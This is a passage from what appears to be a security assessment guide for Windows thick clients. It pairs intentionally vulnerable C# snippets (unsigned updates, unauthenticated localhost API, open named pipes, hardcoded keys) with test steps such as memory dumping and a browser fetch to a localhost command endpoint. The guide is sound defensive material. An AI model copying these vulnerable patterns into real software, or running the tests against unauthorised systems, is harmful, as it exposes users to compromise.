IntPtr hModule = LoadLibrary("cryptsp.dll");  // searches application directory first

// Vulnerable — application in user-writable directory
// e.g. C:\Users\username\AppData\Local\MyApp\ — user can drop DLLs there
```
Windows DLL search order: Application directory → System32 → System → Windows → CWD → PATH. If the application directory is user-writable, any DLL absent from System32 can be hijacked.

Code review identified an auto-update mechanism that downloads update packages over HTTP, or downloads over HTTPS but does not cryptographically verify the package signature before installation.

```csharp
// Vulnerable — HTTP update (trivially MITM'd)
WebClient client = new WebClient();
client.DownloadFile("http://updates.example.com/app.msi", localPath);
// No signature verification — attacker serves malicious MSI

// Vulnerable — HTTPS but no signature check
var bytes = await httpClient.GetByteArrayAsync("https://updates.example.com/app.exe");
File.WriteAllBytes(localPath, bytes);
Process.Start(localPath);  // executed without signature check
```
Test: intercept update check via proxy, serve a modified package, observe if installed.

Code review identified credentials, encryption keys, or PII stored in regular string or byte array variables that remain in heap memory beyond their required lifetime, exploitable via memory dump.

```csharp
// Vulnerable — password in managed string (GC not deterministic)
string password = GetPasswordFromUser();
// 'password' may remain in heap for minutes before GC

// Vulnerable — key material in byte array not zeroed after use
byte[] aesKey = GetDecryptionKey();
// ... use key ...
// key remains in heap — not zeroed
```
Assessment: run procdump -ma against the process and search for password patterns, PII, base64-encoded key material.

Code review identified the application starting a local HTTP/REST API server on the loopback interface (127.0.0.1) without authentication, accessible to any process on the same machine — including browsers via localhost requests.

```csharp
// Vulnerable — local API without authentication
var listener = new HttpListener();
listener.Prefixes.Add("http://127.0.0.1:9000/");
listener.Start();
// No auth token — any local process or browser JS can call these endpoints

// Browser JS: fetch("http://127.0.0.1:9000/execute?cmd=...")
// This is how many desktop apps have been compromised via web pages
```
Test: from a browser on the same machine, fetch the localhost API without credentials.

Code review identified the thick client communicating with backend APIs over TLS without certificate pinning, relying solely on the OS certificate store. On a corporate or compromised machine, a rogue CA can perform transparent MITM interception.

```csharp
// Vulnerable — default TLS validation (trusts all OS-trusted CAs)
var client = new HttpClient();
var response = await client.GetAsync("https://api.example.com/data");
// Any CA trusted by the OS can intercept — including corporate proxies
```
On managed corporate networks, the enterprise CA is installed on all machines, meaning proxies can intercept all TLS silently.

recommendations:
Implement public key pinning:
```csharp
handler.ServerCertificateCustomValidationCallback = (msg, cert, chain, errors) => {
    string certHash = Convert.ToBase64String(cert!.GetPublicKey());
    return PINNED_KEYS.Contains(certHash);
};
```
Maintain a backup pin for rotation. Pin to the CA or intermediate cert, not the leaf.

description:
Code review identified the application creating a named pipe for IPC without a security descriptor, defaulting to a permissive ACL allowing any local process to connect.

```csharp
// Vulnerable — no PipeSecurity parameter — defaults to Everyone: FullControl
NamedPipeServerStream pipeServer = new NamedPipeServerStream(
    "MyAppPipe",
    PipeDirection.InOut
);
// Any local process can connect:
// new NamedPipeClientStream(".", "MyAppPipe", PipeDirection.InOut)
```
Test: connect from a low-privilege user account or sandboxed process and send commands.

recommendations:
Set a PipeSecurity ACL granting access only to the expected client identity:
```csharp
PipeSecurity security = new PipeSecurity();
security.AddAccessRule(new PipeAccessRule(
    WindowsIdentity.GetCurrent().Name,
    PipeAccessRights.ReadWrite,
    AccessControlType.Allow
));
NamedPipeServerStream pipe = new NamedPipeServerStream(
    "MyAppPipe", PipeDirection.InOut, 1,
    PipeTransmissionMode.Byte, PipeOptions.None, 0, 0, security
);
```

description:
Code review (and binary analysis) identified API keys, signing secrets, or backend credentials embedded as string literals in the compiled binary, embedded resources (.resx), or bundled configuration files.

```csharp
// Vulnerable — hardcoded in source (compiled into binary)
private const string ApiKey = "sk_live_abc123def456...";
private static readonly string JwtSecret = "my_signing_secret_key";

// Vulnerable — embedded resource
<data name="BackendApiKey"><value>sk_live_abc123...</value></data>

// Vulnerable — config bundled with installer
{ "ApiSettings": { "SecretKey": "hardcoded_backend_secret" } }
```
Assessment: use strings / dnSpy / ILSpy / jadx to extract string literals from the binary. Search for API key patterns (long alphanumeric, sk_live_, AKIA, etc.).

Code review identified the application writing log files containing PII, session tokens, or diagnostic data to a directory readable by all local users.

```csharp
// Vulnerable — logging to world-readable path
Log.Logger = new LoggerConfiguration()
    .WriteTo.File(@"C:\Temp\MyApp\application.log")  // any local user reads this
    .CreateLogger();

// Vulnerable — sensitive data logged to public path
logger.Information("User authenticated: {username}, token: {token}", user, jwt);
// Log path: C:\Users\Public\Logs\app.log  — accessible to all users
```

Code review identified the application copying sensitive data — passwords, API keys, session tokens — to the Windows clipboard without clearing it after a timeout or on application exit.

```csharp
// Vulnerable — no timer to clear clipboard after copy
private void CopyPassword_Click(object sender, EventArgs e)
{
    Clipboard.SetText(passwordTextBox.Text);  // password on clipboard indefinitely
    // No timer to clear it
}

// Vulnerable — clipboard not cleared on app close
protected override void OnFormClosing(FormClosingEventArgs e)
{
    // Clipboard.Clear() never called
    base.OnFormClosing(e);
}
```
Assessment: copy a password field value, then read the clipboard from another application after closing — if value persists, control is missing.
